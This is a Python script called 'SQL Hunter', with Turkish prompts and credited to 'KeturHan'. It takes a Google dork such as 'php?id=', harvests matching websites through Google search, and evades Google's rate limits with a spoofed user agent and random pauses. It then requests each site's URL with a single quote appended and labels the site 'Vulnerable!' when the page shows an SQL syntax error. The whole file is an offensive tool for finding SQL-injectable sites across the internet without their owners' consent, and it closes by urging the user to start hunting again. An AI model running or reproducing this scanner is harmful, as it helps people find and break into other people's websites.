#/usr/bin/python3
from googlesearch import search
from socket import timeout
import sys
from termcolor import colored
import urllib
import urllib.request
import terminal_banner
import random
import os


os. system('clear')

banner = ("""                  
                                     

  ██████   █████   ██▓    
▒██    ▒ ▒██▓  ██▒▓██▒    
░ ▓██▄   ▒██▒  ██░▒██░    
  ▒   ██▒░██  █▀ ░▒██░    
▒██████▒▒░▒███▒█▄ ░██████▒
▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░
░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░
░  ░  ░     ░   ░   ░ ░   
      ░      ░        ░  ░
                          

 

 ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░              ░             ░  ░   ░     
                                                     

         Im "KeturHan"...           
                            
                                 
                                      
        
           
            
                                    
                        
                                                                                
""")
banner_terminal = terminal_banner.Banner(banner)
print (colored(banner_terminal, 'red')+ "\n")

website_list=[] #list of websites
dork = "inurl:" + input(colored("Sql Dorkunu gir(ör.- php?id=, aspx?id=) ---->  ",'green'))
extension = "site:" + input(colored("website uzantısını gir(ör- .in,.com,.pk) [default:hayır] -----> ",'green')) #Add none as extension
total_output = int(input(colored("Kaç tane websitesi bulmak istediğini belirt) ----> ",'green')))
page_no = int(input(colored("Aramanın kaçıncı sayfadan başlayacagını belirt(eg- 1,2,3) ----> ",'green')))

if extension == "site:":
    extenstion = ""

try:
    query = dork + " " +  extension 
    pause_random = int(random.randrange(4, 10, 2))
    for j in search(query, num=10,start=page_no*5,stop=total_output, pause=pause_random,
    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'): #add User-Agent
        website_list.append(j) 

    for i in website_list:
            try:
                fullurl = i
                try:
                    resp = urllib.request.urlopen(fullurl + "'", timeout=15) #set timeout 
                except timeout:
                    print (i + " ===> " + colored("Time out !",'orange'))
                    pass #pass if website not responding after 15 seconds
                body = resp.read()
                fullbody = body.decode('utf-8')
                if "SQL syntax" in fullbody:  
                    print(i + " ===> " +  colored(" Vulnerable!",'green')) #if vulnerable
                else:
                    print (i + " ===> " + colored(" Not Vulnerable!",'red')) #if not vulnerable
                    
            except:
                print(i + "  ===> " + colored(" Can not be Determined",'blue'))
                continue
except:

    print(" İp adresin Google tarafından banlandı, tekrar arama yapmak için 1 saat beklemen gerekiyor.. ")
    print("prpgramı kapatın açın ve tekrar avlanmaya başlayın :) by KeturHan")
